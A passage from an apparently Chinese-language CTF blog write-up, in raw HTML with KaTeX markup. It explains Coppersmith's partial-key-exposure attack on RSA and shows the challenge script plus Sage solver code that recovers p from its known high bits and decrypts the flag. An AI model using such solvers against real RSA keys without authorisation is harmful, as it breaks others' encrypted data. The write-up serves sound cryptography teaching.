cjk_fallback">件</span></span></span></span></span></p>
<p>已知 p 高位多少位才可以进行攻击</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/21/01c4d611862e88b2.png" alt="" /></p>
<p><code>sage</code>  里面的  <code>small_roots</code>  能实现上述的给出已知的 p 高位进行分解 N 的函数方法，利用 LLL 算法求解非线性低维度多项式方程小根的方法</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>C</mi><mi>o</mi><mi>p</mi><mi>p</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>m</mi><mi>i</mi><mi>t</mi><mi>h</mi><mtext>证明了在已知</mtext><mi>p</mi><mtext>和</mtext><mi>q</mi><mtext>部分比特的情况下，若</mtext><mi>q</mi><mtext>和</mtext><mi>p</mi><mtext>的未知部分的上界</mtext><mi>X</mi><mtext>和</mtext><mi>Y</mi><mtext>满足</mtext><mi>X</mi><mi>Y</mi><mo>&lt;</mo><mo>=</mo><msup><mi>N</mi><mn>0.5</mn></msup><mtext>则Ｎ的多项式可以被分解。</mtext></mrow><annotation encoding="application/x-tex">Coppersmith证明了在已知p和q部分比特的情况下，若q和p的未知部分的上界 X 和 Y 满足 XY &lt;= N ^ {0.5} 则Ｎ的多项式可以被分解。
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal">p</span><span class="mord mathnormal">p</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">s</span><span class="mord mathnormal">m</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord cjk_fallback">证</span><span class="mord cjk_fallback">明</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">已</span><span class="mord cjk_fallback">知</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">和</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">部</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">情</span><span class="mord cjk_fallback">况</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">若</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">和</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">未</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">部</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">界</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord cjk_fallback">和</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">.</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">Ｎ</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">被</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">。</span></span></span></span></span></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/21/64b9418a16177baf.png" alt="" /></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>总而言之就是，存在一个</mtext><mi>e</mi><mtext>阶多项式</mtext><mi>f</mi><mtext>，在模</mtext><mi>n</mi><mtext>意义下，快速求出</mtext><msup><mi>n</mi><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mi>e</mi></mrow></msup><mtext>以内的根</mtext><mspace linebreak="newline"></mspace><mtext>给定</mtext><mi>β</mi><mo stretchy="false">(</mo><mi>n</mi><mtext>的因数</mtext><mo stretchy="false">)</mo><mtext>求出模</mtext><mi>b</mi><mtext>下较小的根，其中</mtext><mi>b</mi><mo>≥</mo><msup><mi>n</mi><mi>β</mi></msup></mrow><annotation encoding="application/x-tex">总而言之就是，存在一个e阶多项式f，在模n意义下，快速求出n^{1/e}以内的根\\给定\beta(n的因数)求出模b下较小的根，其中b \geq n^{\beta}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.13244em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">总</span><span class="mord cjk_fallback">而</span><span class="mord cjk_fallback">言</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">阶</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">意</span><span class="mord cjk_fallback">义</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">快</span><span class="mord cjk_fallback">速</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">出</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">/</span><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">内</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">根</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">给</span><span class="mord cjk_fallback">定</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">数</span><span class="mclose">)</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">较</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">根</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">中</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05278em;">β</span></span></span></span></span></span></span></span></span></span></span></span></span></p>
<p>先上一道不知从哪扒来的例题看一下吧</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2 </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> random </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA </pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">def</span> <span class="token function">generate_public_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> </pre></td></tr><tr><td data-num="6"></td><td><pre>	part1 <span class="token operator">=</span> <span class="token number">754000048691689305453579906499719865997162108647179376656384000000000000001232324121</span> 		part1bits <span class="token operator">=</span> part1<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="7"></td><td><pre>    lastbits <span class="token operator">=</span> <span class="token number">512</span> <span class="token operator">-</span> part1<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="8"></td><td><pre>    part1 <span class="token operator">=</span> part1 <span class="token operator">&lt;&lt;</span> lastbits </pre></td></tr><tr><td data-num="9"></td><td><pre>    part2 <span class="token operator">=</span> random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">**</span>lastbits<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="10"></td><td><pre>    p <span class="token operator">=</span> part1 <span class="token operator">+</span> part2 </pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">while</span> <span class="token keyword">not</span> gmpy2<span class="token punctuation">.</span>is_prime<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span> </pre></td></tr><tr><td data-num="12"></td><td><pre>        p <span class="token operator">=</span> part1 <span class="token operator">+</span> random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">**</span>lastbits<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="13"></td><td><pre>    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="14"></td><td><pre>    n <span class="token operator">=</span> p <span class="token operator">*</span> q </pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">print</span> p </pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">print</span> q </pre></td></tr><tr><td data-num="17"></td><td><pre>    e <span class="token operator">=</span> <span class="token number">0x10001</span> </pre></td></tr><tr><td data-num="18"></td><td><pre>    key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">long</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">long</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="19"></td><td><pre>    key <span class="token operator">=</span> key<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'public.pem'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span> </pre></td></tr><tr><td data-num="21"></td><td><pre>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>key<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> </pre></td></tr><tr><td data-num="23"></td><td><pre>    flag <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="24"></td><td><pre>    flag <span class="token operator">=</span> flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="25"></td><td><pre>    flag <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./public.pem'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span> </pre></td></tr><tr><td data-num="27"></td><td><pre>        key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>f<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="28"></td><td><pre>        enc <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> key<span class="token punctuation">.</span>e<span class="token punctuation">,</span> key<span class="token punctuation">.</span>n<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.enc'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span> </pre></td></tr><tr><td data-num="30"></td><td><pre>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="31"></td><td><pre>generate_public_key<span class="token punctuation">(</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="32"></td><td><pre>encrypt<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token comment">#n=0x639386F4941D1511D89A9D19DC4731188D3F4D2D04623FB26F5A85BB3A54747BCBADCDBD8E4A75747DB4072A90F62DCA08F11AC276D7588042BEFA504DCD87CD3B0810F1CB28168A53F9196CDAF9FD1D12DCD4C375EB68B67A8EFCCEC605C57C736943170FEF177175F696A0F6123B993E56FFBF1B62435F728A0BAC018D0113 </span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token comment">#e=0x10001</span></pre></td></tr></table></figure><p>我们已知的 part1 的比特位为 279 位，距离我们的条件还差 9 位左右，我们还需要爆破  <code>9</code>  位左右的数据。<br />
由于  <code>9</code>  位左右的 bit 需要至少  <code>3</code>  位十六进制 (3*4&gt; 9)</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>kbits <span class="token operator">=</span> pbits <span class="token operator">-</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="2"></td><td><pre> roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span></pre></td></tr></table></figure><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span> </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> binascii </pre></td></tr><tr><td data-num="3"></td><td><pre>n <span class="token operator">=</span> <span class="token number">0x639386F4941D1511D89A9D19DC4731188D3F4D2D04623FB26F5A85BB3A54747BCBADCDBD8E4A75747DB4072A90F62DCA08F11AC276D7588042BEFA504DCD87CD3B0810F1CB28168A53F9196CDAF9FD1D12DCD4C375EB68B67A8EFCCEC605C57C736943170FEF177175F696A0F6123B993E56FFBF1B62435F728A0BAC018D0113</span> </pre></td></tr><tr><td data-num="4"></td><td><pre>cipher <span class="token operator">=</span> <span class="token number">0x56c5afbc956157241f2d4ea90fd24ad58d788ca1fa2fddb9084197cfc526386d223f88be38ec2e1820c419cb3dad133c158d4b004ae0943b790f0719b40e58007ba730346943884ddc36467e876ca7a3afb0e5a10127d18e3080edc18f9fbe590457352dca398b61eff93eec745c0e49de20bba1dd77df6de86052ffff41247d</span> </pre></td></tr><tr><td data-num="5"></td><td><pre>e2 <span class="token operator">=</span> <span class="token number">0x10001</span> </pre></td></tr><tr><td data-num="6"></td><td><pre>pbits <span class="token operator">=</span> <span class="token number">512</span> </pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4095</span><span class="token punctuation">)</span><span class="token punctuation">:</span> </pre></td></tr><tr><td data-num="8"></td><td><pre>    p4 <span class="token operator">=</span> <span class="token number">0x635c3782d43a73d70465979599f65622c7b4242a2d623459337100000000004973c619000</span> </pre></td></tr><tr><td data-num="9"></td><td><pre>    p4 <span class="token operator">=</span> p4 <span class="token operator">+</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="10"></td><td><pre>    kbits <span class="token operator">=</span> pbits <span class="token operator">-</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#未知需要爆破的比特位数 </span></pre></td></tr><tr><td data-num="11"></td><td><pre>    p4 <span class="token operator">=</span> p4 <span class="token operator">&lt;&lt;</span> kbits </pre></td></tr><tr><td data-num="12"></td><td><pre>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#生成一个以 x 为符号的一元多项式环</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    f <span class="token operator">=</span> x <span class="token operator">+</span> p4 <span class="token comment">#定义求解的函数</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span> <span class="token comment">#进行爆破  多项式小值根求解及因子分解 X：表示求解根的上界 beta 即是前面提到的 β ，当 p,q 二进制位数相同时一般只能取 0.4；</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token comment">#print roots </span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">if</span> roots<span class="token punctuation">:</span> <span class="token comment">#爆破成功，求根 </span></pre></td></tr><tr><td data-num="17"></td><td><pre>        p <span class="token operator">=</span> p4<span class="token operator">+</span><span class="token builtin">int</span><span class="token punctuation">(</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">assert</span> n <span class="token operator">%</span> p <span class="token operator">==</span> <span class="token number">0</span> </pre></td></tr><tr><td data-num="19"></td><td><pre>        q <span class="token operator">=</span> n<span class="token operator">//</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="20"></td><td><pre>        phin <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="21"></td><td><pre>        d <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>e2<span class="token punctuation">,</span>phin<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="22"></td><td><pre>        flag <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="23"></td><td><pre>        flag <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> </pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">print</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>回到初始，</mtext><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>1</mn><mtext>中</mtext><mo stretchy="false">(</mo><mi>p</mi><mo>&gt;</mo><mo>&gt;</mo><mn>128</mn><mo stretchy="false">)</mo><mo>&lt;</mo><mo>&lt;</mo><mn>128</mn><mtext>给出了</mtext><mi>p</mi><mtext>的高</mtext><mn>384</mn><mtext>位，需要我们推理出未知的低</mtext><mn>128</mn><mtext>位</mtext><mi mathvariant="normal">.</mi><mtext>记原</mtext><mi>p</mi><mtext>为</mtext><msub><mi>p</mi><mrow><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi></mrow></msub><mo>+</mo><mi>x</mi><mspace linebreak="newline"></mspace><mtext>求解方程</mtext><mi>p</mi><mo>=</mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mspace width="1em"/><mi>s</mi><mi>t</mi><mi>h</mi><mspace width="1em"/><mi>d</mi><mi>i</mi><mi>v</mi><mi>i</mi><mi>d</mi><mi>e</mi><mi>s</mi><mspace width="1em"/><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">回到初始，hint1中(p &gt;&gt; 128)&lt;&lt;128 给出了p的高384位，需要我们推理出未知的低128位.记原p为p_{high}+x \\
求解方程p=0(mod \quad sth \quad divides \quad n)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">回</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">初</span><span class="mord cjk_fallback">始</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">1</span><span class="mord cjk_fallback">中</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">2</span><span class="mord">8</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord">1</span><span class="mord">2</span><span class="mord">8</span><span class="mord cjk_fallback">给</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">了</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">高</span><span class="mord">3</span><span class="mord">8</span><span class="mord">4</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">推</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">未</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">低</span><span class="mord">1</span><span class="mord">2</span><span class="mord">8</span><span class="mord cjk_fallback">位</span><span class="mord">.</span><span class="mord cjk_fallback">记</span><span class="mord cjk_fallback">原</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">为</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">程</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#已知 p 高位，求低位</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">def</span> <span class="token function">phase</span><span class="token punctuation">(</span>high_p<span class="token punctuation">,</span> n<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    R<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span> implementation<span class="token operator">=</span><span class="token string">'NTL'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    p <span class="token operator">=</span> high_p <span class="token operator">+</span> x</pre></td></tr><tr><td data-num="5"></td><td><pre>    roots <span class="token operator">=</span> p<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">^</span><span class="token number">128</span><span class="token punctuation">,</span> beta <span class="token operator">=</span> <span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    </pre></td></tr><tr><td data-num="7"></td><td><pre>    P <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">(</span>roots<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    Q <span class="token operator">=</span> n <span class="token operator">//</span> P</pre></td></tr><tr><td data-num="9"></td><td><pre>    </pre></td></tr><tr><td 